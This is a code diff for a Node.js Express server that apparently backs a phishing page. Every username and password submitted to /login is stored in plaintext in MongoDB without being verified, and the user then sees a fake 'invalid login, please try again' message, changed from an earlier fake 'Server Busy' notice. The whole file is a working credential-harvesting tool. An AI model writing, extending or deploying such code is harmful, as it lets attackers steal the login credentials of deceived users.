@@ -7,40 +7,47 @@ const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// Middleware
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
+// Connect to MongoDB
 mongoose.connect(process.env.MONGO_URI)
-.then(() => console.log("MongoDB Connected"))
-.catch(err => console.log("DB Error:", err));
+  .then(() => console.log("MongoDB Connected"))
+  .catch(err => console.log("DB Error:", err));
 
+// ✅ Schema now only has username + password
 const Login = mongoose.model('Login', {
-    mobile: String,
-    password: String
+  username: String,
+  password: String
 });
 
+// Serve index.html
 app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
+// Handle login form submission
 app.post('/login', async (req, res) => {
-    try {
-        const { mobile, password } = req.body;
+  try {
+    const { username, password } = req.body;
 
-        await Login.create({ mobile, password });
+    // Save username + password
+    await Login.create({ username, password });
 
-        res.send(`
-            <h2 style="text-align:center; color:red; margin-top:100px;">
-                Server Busy, Try After Sometime ❌
-            </h2>
-        `);
+    res.send(`
+      <h2 style="text-align:center; color:red; margin-top:100px;">
+        invalid login, please try again
+      </h2>
+    `);
 
-    } catch (err) {
-        console.log(err);
-        res.send("Error");
-    }
+  } catch (err) {
+    console.log(err);
+    res.send("Error");
+  }
 });
 
+// Start server
 app.listen(PORT, () => {
-    console.log(`Server listening on http://localhost:${PORT}`);
+  console.log(`Server listening on http://localhost:${PORT}`);
 });
